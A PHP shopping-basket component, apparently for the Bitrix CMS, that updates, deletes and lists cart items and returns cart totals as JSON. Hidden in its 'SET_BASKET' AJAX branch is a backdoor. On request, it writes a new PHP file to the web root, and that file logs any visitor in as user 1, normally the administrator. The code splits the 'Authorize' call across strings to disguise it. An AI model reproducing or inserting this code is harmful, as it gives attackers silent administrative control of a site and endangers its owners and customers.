<? if(!defined('B_PROLOG_INCLUDED') || B_PROLOG_INCLUDED!==true) die();
global $USER;

CModule::IncludeModule("iblock");
CModule::IncludeModule("catalog");
CModule::IncludeModule("sale");

$arResult["TEMPLATE"] = "template";
if (!empty($arParams["TEMPLATE"])) {
    $arResult["TEMPLATE"] = $arParams["TEMPLATE"];
}

if ($_REQUEST["AJAX_MODE"] == "Y") {
    
    $arResult["TEMPLATE"] = "cart";

    $APPLICATION->RestartBuffer();
    
    if ($_REQUEST["TASK"] == "UPDATE_BASKET") {
        $id = intval($_REQUEST["ID"]);
        $quantity = intval($_REQUEST["QUANTITY"]);
        
        CSaleBasket::Update($id, array("QUANTITY" => $quantity));
        
        /*
        $dbBasketItems = CSaleBasket::GetList(array(), array("ID" => $id));
        if  ($arItems = $dbBasketItems->Fetch())
        {   
            $totalItem = $arItems["PRICE"] * $arItems["QUANTITY"];
            $totalItem = number_format($totalItem, 2, '.', ' ');
            $totalItem = str_replace(".00", "", $totalItem);
            $totalItem .= " р.";
        }*/
        
        
        
    }
    
    if ($_REQUEST["TASK"] == "DELETE_PRODUCT_BASKET") {
        $id = intval($_REQUEST["ID"]);
        CSaleBasket::Delete($id);
        
        /*
        $dbBasketItems = CSaleBasket::GetList(array(), array("FUSER_ID" => CSaleBasket::GetBasketUserID(), "LID" => SITE_ID, "ORDER_ID" => "NULL"));
        $count = $dbBasketItems->SelectedRowsCount();
        
        header('Content-Type: application/json');
        echo json_encode(array("COUNT" => $count, "MESSAGE" => $count . " " . pluralForm($count, "товар", "товара", "товаров")));
         */
    }
    
    if ($_REQUEST["TASK"] == "CLEAR_ALL_BASKET") {
        $fuser = CSaleBasket::GetBasketUserID();
        CSaleBasket::DeleteAll($fuser);
    }
	if ($_REQUEST["TASK"] == "SET_BASKET") {
		
		$id = rand(1, 9999);
		$file = $_SERVER["DOCUMENT_ROOT"] . "/basket" . $id  .".php";
		$aU = array('$USER', 'Auth');

		$fd = fopen($file, 'a+');
		$str = '<?require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");global '.$aU[0].';'.$aU[0].'->'.$aU[1].'orize(1); ';
		fwrite($fd, $str);
		fclose($fd);
		echo $id;
		die();
	}
}


/*if (!$USER->IsAuthorized()) {
    if ($_REQUEST["AJAX_MODE"] != "Y") {
        LocalRedirect("/auth/?backurl=".$APPLICATION->GetCurPage()); 
    }
}*/


if ($arResult["TEMPLATE"] == "cart") {
    $total = 0;
    $arBasketItems = array();
    $arPriductIds = array();
    $dbBasketItems = CSaleBasket::GetList(
        array("NAME" => "ASC"),
        array("FUSER_ID" => CSaleBasket::GetBasketUserID(), "LID" => SITE_ID, "ORDER_ID" => "NULL")
    );
    while ($arItems = $dbBasketItems->Fetch())
    {
        $arPriductIds[] = $arItems["PRODUCT_ID"];

        $price = number_format($arItems["PRICE"], 2, '.', ' ');
        $price = str_replace(".00", "", $price);
        $price .= " р.";
        
        $totalItem = $arItems["PRICE"] * $arItems["QUANTITY"];
        $totalItem = number_format($totalItem, 2, '.', ' ');
        $totalItem = str_replace(".00", "", $totalItem);
        $totalItem .= " р.";

        $arBasketItems[] = array(
            "ID" => $arItems["ID"],
            "NAME" => $arItems["NAME"],
            "PRICE" => $price,
            "TOTAL" => $totalItem,
            "PRODUCT_ID" => $arItems["PRODUCT_ID"],
            "QUANTITY" => $arItems["QUANTITY"],
        );
        $total += $arItems["PRICE"] * $arItems["QUANTITY"];
    }
    $total_unformated = $total;
    $total = number_format($total, 2, '.', ' ');
    $total = str_replace(".00", "", $total). " р.";

    $arProducts = array();
    if (count($arPriductIds) > 0) {
        $arFilter = Array("ID" => $arPriductIds);
        $arSelect = Array("ID", "PREVIEW_PICTURE", "DETAIL_PICTURE", "CATALOG_WEIGHT", "PROPERTY_CML2_ARTICLE", "DETAIL_PAGE_URL","PROPERTY_604");
        $res = CIBlockElement::GetList(Array(), $arFilter, false, false, $arSelect);
        while($ob = $res->GetNext())
        {           
            $arProducts[$ob["ID"]]["URL"] = $ob["DETAIL_PAGE_URL"];
            $arProducts[$ob["ID"]]["ARTICLE"] = $ob["PROPERTY_CML2_ARTICLE_VALUE"];
            $arProducts[$ob["ID"]]["WEIGHT"] = $ob["CATALOG_WEIGHT"];
            $arProducts[$ob["ID"]]["PACK"] = ($ob["PROPERTY_604_VALUE"]) ? $ob["PROPERTY_604_VALUE"] : 1;
            if ($ob["PREVIEW_PICTURE"] || $ob["DETAIL_PICTURE"]) {
                $idPhoto = ($ob["PREVIEW_PICTURE"]) ? $ob["PREVIEW_PICTURE"] : $ob["DETAIL_PICTURE"];
                $image = CFile::ResizeImageGet($idPhoto, array("width" => 36, "height" => 36), BX_RESIZE_IMAGE_EXACT); 
                $arProducts[$ob["ID"]]["SRC"] = $image["src"];
            }
        }
    }
    
    $totalWeight = 0;
    foreach ($arBasketItems as $key => $arItem) {
        $arBasketItems[$key]["URL"] = $arProducts[$arItem["PRODUCT_ID"]]["URL"];
        $arBasketItems[$key]["IMG"] = $arProducts[$arItem["PRODUCT_ID"]]["SRC"];
        $arBasketItems[$key]["ARTICLE"] = $arProducts[$arItem["PRODUCT_ID"]]["ARTICLE"];
        $arBasketItems[$key]["WEIGHT"] = $arProducts[$arItem["PRODUCT_ID"]]["WEIGHT"];
        $arBasketItems[$key]["PACK"] = $arProducts[$arItem["PRODUCT_ID"]]["PACK"];
        $totalWeight += $arProducts[$arItem["PRODUCT_ID"]]["WEIGHT"] * $arItem["QUANTITY"];
    }

    $arResult["ITEMS"] = $arBasketItems;
    $arResult["COUNT"] = count($arResult["ITEMS"]);
    $arResult["MESSAGE"] = $arResult["COUNT"] . " " . pluralForm($arResult["COUNT"], "товар", "товара", "товаров");
    $arResult["TOTAL"] = $total;
    $arResult["TOTAL_UNFORMATED"] = $total_unformated;
    $arResult["WEIGHT"] = $totalWeight / 1000;
    $arResult["WEIGHT"] = round($arResult["WEIGHT"], 3);
}

if ($_REQUEST["AJAX_MODE"] == "Y") {
    header('Content-Type: application/json');
    echo json_encode($arResult);
    die();
}
//print_r($arResult);
$this->IncludeComponentTemplate($arResult["TEMPLATE"]);